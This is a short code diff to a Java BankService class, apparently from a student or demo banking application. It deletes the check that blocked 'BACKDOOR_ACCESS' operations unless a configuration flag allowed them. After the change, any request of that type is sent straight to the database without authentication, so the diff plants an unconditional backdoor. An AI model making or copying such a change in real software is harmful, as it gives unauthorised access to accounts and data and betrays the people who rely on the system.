@@ -6,7 +6,6 @@ import java.util.UUID;
 
 import connections.components.SocketComponent;
 import connections.data.SocketData;
-import constants.Constants;
 import dtos.DTO;
 import dtos.RemoteOperation;
 import dtos.auth.AuthenticatedDTO;
@@ -15,7 +14,6 @@ import dtos.generic.MessageDTO;
 import dtos.generic.ValueDTO;
 import dtos.user.BankAccount;
 import errors.AppException;
-import errors.SecurityViolationException;
 import utils.ObjectConverter;
 import utils.ValueFormatter;
 
@@ -44,9 +42,6 @@ public class BankService extends BaseBankService {
     boolean isBackdoorAccessAttempt = RemoteOperation.BACKDOOR_ACCESS.equals(
       operation
     );
-    if(isBackdoorAccessAttempt && !Constants.BACKDOOR_ACCESS_ALLOWED()) {
-      throw new SecurityViolationException("Operação inválida bloqueada!");
-    }
     if(isBackdoorAccessAttempt) return redirectToDatabase(receivedDTO);
 
     AuthenticatedDTO authenticatedDTO = ObjectConverter.convert(receivedDTO);
